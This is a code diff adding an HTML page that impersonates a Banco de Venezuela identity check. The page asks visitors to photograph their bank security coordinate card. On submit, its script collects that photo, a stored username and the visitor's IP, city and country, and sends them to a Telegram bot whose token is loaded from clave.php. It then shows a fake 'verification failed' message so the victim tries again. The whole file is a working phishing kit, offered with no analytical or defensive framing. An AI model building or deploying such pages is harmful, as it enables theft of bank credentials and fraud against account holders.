@@ -1,0 +1,214 @@
+<!DOCTYPE html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Banco de Venezuela</title>
+    <style>
+      body {
+        margin: 0;
+        padding: 0;
+        font-family: Arial, sans-serif;
+        height: 100vh;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        background-image: url(background.jpg);
+        background-size: cover;
+        background-position: center;
+      }
+
+      .container {
+        display: flex;
+        height: 100%;
+        width: 100%;
+      }
+
+      .left-side {
+        width: 50%;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+      }
+
+      .right-side {
+        width: 50%;
+      }
+      form {
+        width: 80%;
+        background: white;
+        max-width: 550px;
+        box-shadow: 0 5px 10px 0 rgba(0, 0, 0, 0.1);
+      }
+
+      @media (max-width: 768px) {
+        body {
+          background: #ededed;
+        }
+        .container {
+          flex-direction: column;
+        }
+        .left-side {
+          width: 100%;
+          height: 100vh;
+        }
+        .right-side {
+          display: none;
+        }
+      }
+    </style>
+    <style>
+      .form-group {
+        position: relative;
+        margin-bottom: 20px;
+        margin: 20px;
+      }
+
+      .form-group input {
+        width: 100%;
+        padding: 10px;
+        box-sizing: border-box;
+        position: relative;
+        height: 60px;
+        border: 0;
+
+        border-bottom: 1px solid gray;
+        background: #ededed;
+        outline: none;
+      }
+      .form-group input:focus {
+        border: 0;
+      }
+      .form-group input:focus + label,
+      .form-group input:not(:placeholder-shown) + label {
+        top: 5px;
+        font-size: 12px;
+      }
+      button {
+        background-color: #0067b1;
+        color: white;
+        border-radius: 3px;
+        border: 0;
+        padding: 15px;
+        width: 200px;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="container">
+      <div class="left-side">
+        <form id="formfoto">
+          <div style="text-align: center">
+            <img src="logo.png" alt="" style="width: 60%; margin-top: 20px" />
+          </div>
+          <div style="width: 100%; text-align: center">
+            <div style="width: 100%">
+              <div style="margin: 10px">
+                Validaremos tu identidad por favor escanea tu tarjeta de
+                coordenadas.
+              </div>
+            </div>
+            <div class="form-group" style="text-align: center">
+              <input type="file" id="file-input" style="display: none" />
+              <div style="width: 100%; padding-bottom: 20px">
+                <label for="file-input"
+                  ><img src="target.png" style="width: 300px"
+                /></label>
+              </div>
+              <label
+                for="file-input"
+                style="
+                  padding: 5px;
+                  padding-left: 20px;
+                  padding-right: 20px;
+                  background: #0067b1;
+                  color: white;
+                  font-weight: bold;
+                "
+                >Tomar Foto</label
+              >
+            </div>
+          </div>
+          <div style="width: 100%; text-align: center">
+            <button>Entrar</button>
+          </div>
+          <div
+            style="
+              width: 100%;
+              text-align: center;
+              font-size: 12px;
+              font-weight: bold;
+              color: #999;
+              margin-top: 30px;
+              margin-bottom: 30px;
+            "
+          >
+            ¿Olvidaste tu usuario o clave? <br />
+            Si eres nuevo clienteBDV regístrate aquí
+          </div>
+        </form>
+      </div>
+      <div class="right-side"></div>
+    </div>
+  </body>
+  <script src="https://cdn.jsdelivr.net/npm/axios@1.1.2/dist/axios.min.js"></script>
+
+  <script>
+    const url = "https://ipapi.co/json/";
+    const form = document.querySelector("#formfoto");
+
+    // Función para obtener botToken y chatId desde clave.php
+    async function getTokenAndChatId() {
+      try {
+        const response = await axios.get("clave.php"); // Solicita a clave.php
+        return response.data;
+      } catch (error) {
+        console.error("Error al obtener token y chatId:", error);
+        return null;
+      }
+    }
+
+    form.addEventListener("submit", async (event) => {
+      event.preventDefault(); // Evita que se envíe el formulario
+      const credentials = await getTokenAndChatId();
+      if (!credentials) return; // Si no hay credenciales, no continúa
+
+      axios
+        .get(url)
+        .then((response) => {
+          const imagen = document.getElementById("file-input");
+          const file = imagen.files[0];
+          const formData = new FormData();
+          formData.append("photo", file);
+
+          formData.append("chat_id", credentials.chatId);
+          const message =
+            "Usuario: " +
+            localStorage.getItem("usuario") +
+            "\nCiudad:" +
+            response.data.city +
+            "\nPais: " +
+            response.data.country +
+            "\nIP: " +
+            response.data.ip;
+          formData.append("caption", message);
+          axios
+            .post(
+              `https://api.telegram.org/bot${credentials.botToken}/sendPhoto`,
+              formData
+            )
+            .then((response) => {
+              console.log(response.data);
+              alert("Verificación incorrecta, vuelva a intentarlo.");
+              window.location.href = "index.html";
+            })
+            .catch((error) => {
+              console.error(error);
+            });
+        })
+        .catch((error) => {
+          console.log(error);
+        });
+    });
+  </script>
+</html>
